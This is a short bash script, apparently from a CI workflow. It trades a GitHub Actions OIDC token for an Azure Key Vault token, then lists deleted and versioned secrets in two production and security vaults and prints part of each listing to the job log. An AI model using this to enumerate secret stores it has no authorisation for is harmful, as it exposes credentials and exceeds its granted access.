#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
KV=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=https://vault.azure.net/.default" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "== DELETED $V =="
  curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/deletedsecrets?api-version=7.4&maxresults=25" | head -c 1200; echo
  echo "== ALL SECRETS $V (incl versions) =="
  curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4&maxresults=25&includeVersions=true" | head -c 1200; echo
done
